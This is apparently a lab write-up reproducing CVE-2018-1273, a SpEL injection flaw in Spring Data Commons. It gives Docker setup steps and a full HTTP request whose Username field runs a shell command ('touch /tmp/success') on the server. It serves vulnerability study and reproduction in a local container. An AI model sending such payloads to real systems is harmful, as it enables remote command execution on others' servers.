# Spring Data Commons Remote Command Execution Vulnerability (CVE-2018-1273)

Spring Data is an open source framework for simplifying database access and supporting cloud services. Spring Data Commons is the foundation for all subprojects shared under Spring Data. Spring Data Commons In 2.0.5 and earlier, there was a SpEL expression injection vulnerability that could allow an attacker to inject a malicious SpEL expression to execute arbitrary commands.

Reference link:

- https://pivotal.io/security/cve-2018-1273
- https://xz.aliyun.com/t/2269
- https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&mid=2247483666&idx=1&sn=91e3b2aab354c55e0677895c02fb068c

## Environment Building

Execute the following command to start the vulnerability environment:

```
Docker-compose up -d
```

Wait a moment, after the environment starts, visit `http://your-ip:8080/users` and you will see a user registration page.

## Vulnerability recurrence

Refer to the Payload in the previous link to capture the packet at the time of registration and modify it to the following data packet:

```
POST /users?page=&size=5 HTTP/1.1
Host: localhost:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html, application/xhtml+xml, application/xml; q=0.9, image/webp, image/apng, */*; q=0.8
Referer: http://localhost:8080/users?page=0&size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN, zh; q=0.9, en; q=0.8

Username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=
```

Execute `docker-compose exec spring bash` into the container, you can see that the successful creation of `/tmp/success`, indicating that the command is executed successfully:

![](1.png)